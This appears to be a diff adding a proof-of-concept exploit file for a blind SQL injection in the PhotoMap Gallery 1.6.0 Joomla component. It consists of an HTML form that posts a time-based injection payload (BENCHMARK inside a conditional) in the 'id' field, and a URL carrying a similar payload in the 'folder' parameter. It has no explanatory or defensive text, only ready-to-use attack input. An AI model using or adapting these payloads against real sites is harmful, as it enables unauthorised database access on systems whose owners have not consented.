@@ -1,0 +1,19 @@
+&lt;html&gt;
+	&lt;head&gt;
+	    &lt;title&gt;PoC - PhotoMap Gallery 1.6.0 Blind SQL Injection&lt;/title&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+	    &lt;form method="POST" action="http://www.example.com/joomla/index.php"&gt;
+	        &lt;input type="hidden" name="89eb36eca1919aff534b13b54796c9a4" value="1"&gt;
+			&lt;input type="hidden" name="option" value="com_photomapgallery"&gt;
+			&lt;input type="hidden" name="controller" value=""&gt;
+			&lt;input type="hidden" name="view" value="user"&gt;
+		    &lt;input type="hidden" name="task" value="save_usercategory"&gt;
+		    &lt;input type="hidden" name="id" value="-1 AND (SELECT(IF(0x41=0x41, BENCHMARK(99999999999,NULL),NULL)))"&gt;
+		    &lt;input type="submit"&gt;
+	    &lt;/form&gt;
+	&lt;/body&gt;
+&lt;/html&gt;
+
+
+http://www.example.com/index.php?option=com_photomapgallery&view=imagehandler&folder=-1 OR (SELECT(IF(0x41=0x41,BENCHMARK(9999999999,NULL),NULL)))
